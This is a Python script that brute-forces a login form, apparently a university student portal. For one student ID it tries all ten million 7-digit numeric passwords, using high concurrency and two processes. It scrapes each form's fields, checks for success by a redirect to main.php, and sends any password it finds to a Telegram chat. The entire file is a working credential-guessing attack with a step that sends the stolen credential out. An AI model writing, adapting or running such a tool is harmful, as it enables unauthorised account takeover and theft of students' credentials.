import asyncio
import aiohttp
from bs4 import BeautifulSoup
from concurrent.futures import ProcessPoolExecutor
from dotenv import load_dotenv
from os import getenv
load_dotenv()


STUDENT_ID = getenv("USR")
PASSWORD   = ""
TELEGRAM_TOKEN   =  getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = getenv("TELEGRAM_CHAT_ID")

BASE_URL  = getenv("URL")
LOGIN_URL = f"{BASE_URL}/"
HOME_URL  = f"{BASE_URL}/views/main.php"

CONCURRENT_LIMIT = 35  
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"

async def notify(session, message: str):
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        await session.post(TELEGRAM_URL, data=data, timeout=5)
    except:
        pass

async def attempt_login(session, PASSWORD, semaphore, stop_event):
    if stop_event.is_set():
        return

    async with semaphore:  # Limits to prevent overwhelming
        try:
            # Get Login Page & CSRF
            async with session.get(LOGIN_URL, timeout=10) as resp:
                html = await resp.text()
                soup = BeautifulSoup(html, "lxml")
                
                form = soup.find("form")
                payload = {inp.get("name"): inp.get("value", "") 
                           for inp in form.find_all("input") if inp.get("name")}
                
                for key in list(payload.keys()):
                    k = key.lower()
                    if any(x in k for x in ["user", "id", "student", "login", "username", "قيد"]):
                        payload[key] = STUDENT_ID
                    elif any(x in k for x in ["pass", "password", "كلمة"]):
                        payload[key] = PASSWORD
                

            # Post Login
            async with session.post(LOGIN_URL, data=payload, timeout=10) as resp:
                # Check Home Page
                async with session.get(HOME_URL, timeout=10) as home_resp:
                    final_url = str(home_resp.url)
                    if HOME_URL in final_url or "main.php" in final_url:
                        print(f"Success found! {PASSWORD}")
                        await notify(session, f"{STUDENT_ID}: {PASSWORD}")
                        stop_event.set()
                        return True
        except Exception:
            pass
    return False

async def run_async_loop(start_val, end_val):
    semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)
    stop_event = asyncio.Event()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    connector = aiohttp.TCPConnector(limit=CONCURRENT_LIMIT, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
        tasks = []
        for i in range(start_val, end_val):
            if stop_event.is_set():
                break
                
            PASSWORD = f"{i:07d}"
            task = asyncio.create_task(attempt_login(session, PASSWORD, semaphore, stop_event))
            tasks.append(task)
            
            # Clean up memory every 200 tasks
            if i % 200 == 0:
                await asyncio.sleep(0) # Let the event loop breathe
                tasks = [t for t in tasks if not t.done()]

        await asyncio.gather(*tasks, return_exceptions=True)

def core_entry_point(start, end):
    """Function that initializes the async loop on a specific CPU core."""
    asyncio.run(run_async_loop(start, end))

if __name__ == "__main__":
    total_range = 10_000_000
    mid_point = total_range // 2
    work_chunks = [(0, mid_point), (mid_point, total_range)]

    print(f"🚀 Launching 2-core brute force on Railway (1GB RAM Safe Mode)")
    
    with ProcessPoolExecutor(max_workers=2) as executor:
        # Each process takes one half of the range
        executor.map(core_entry_point, [c[0] for c in work_chunks], [c[1] for c in work_chunks])
